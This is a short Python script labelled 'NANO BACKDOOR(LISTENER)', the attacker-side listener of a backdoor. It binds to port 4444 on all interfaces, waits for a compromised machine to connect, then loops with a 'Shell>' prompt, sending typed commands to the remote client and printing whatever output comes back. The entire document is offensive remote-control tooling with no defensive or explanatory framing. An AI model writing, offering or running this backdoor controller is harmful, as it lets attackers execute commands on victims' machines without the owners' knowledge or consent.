#NANO BACKDOOR(LISTENER)
import socket
import subprocess

TARGET = "0.0.0.0"
port = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((TARGET, port))
sock.listen(1)

print(f"[+] Listening on port {port} ...")
client_socket, client_addr = sock.accept()
print(f"[+] Connection from {client_addr}")

while True:
    command = input("Shell> ")
    if command.strip() == "":
        continue
    client_socket.send(command.encode())

    if command.lower() == "exit":
        break

    result = client_socket.recv(4096).decode()
    print(result)

client_socket.close()
sock.close()
